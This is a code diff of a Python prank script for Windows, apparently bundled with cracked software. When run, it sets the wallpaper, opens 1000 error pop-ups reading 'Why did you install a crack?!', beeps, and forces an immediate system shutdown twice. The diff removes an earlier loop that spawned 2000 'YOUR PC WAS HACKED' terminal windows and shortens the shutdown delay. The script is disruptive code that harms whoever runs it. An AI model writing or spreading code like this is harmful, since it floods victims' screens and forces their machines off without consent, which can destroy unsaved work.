@@ -6,35 +6,31 @@ import winsound
 import subprocess
 
 def change_wallpaper(image_path):
+    if not os.path.exists(image_path):
+        show_message("Error", "The specified image path does not exist.")
+        return
+
     try:
         ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)
-        for _ in range(1000): 
+        for _ in range(1000):  
             show_message("Warning", "Why did you install a crack?!")
         print("#ctypes:1000")
     except Exception as e:
         show_message("Error", f"Failed to change wallpaper: {e}")
         
 def shutdown_pc():
-    winsound.Beep(1000, 500)  
-    winsound.Beep(1500, 500)
-    print("YOUR PC WAS HACKED LOL HAHAH")
-    subprocess.run("shutdown /s /t 20", shell=True)
+    winsound.Beep(440, 1000)  
+    winsound.Beep(660, 1000) 
+    subprocess.run("shutdown /s /t 5", shell=True)  
 
 def show_message(title, message):
     root = tk.Tk()
     root.withdraw()  
-    messagebox.showerror(title, message)
+    messagebox.showerror(title, message)  
 
 image_path = "d:\\download\\wallpaperflare.com_wallpaper (2).jpg"  
 
 change_wallpaper(image_path)
 shutdown_pc()
-import subprocess
-import time
 
-def open_terminal_windows():
-    for _ in range(2000):
-        subprocess.Popen('start cmd /K echo YOUR PC WAS HACKED LOL')
-
-time.sleep(1)
-open_terminal_windows()
+shutdown_pc()
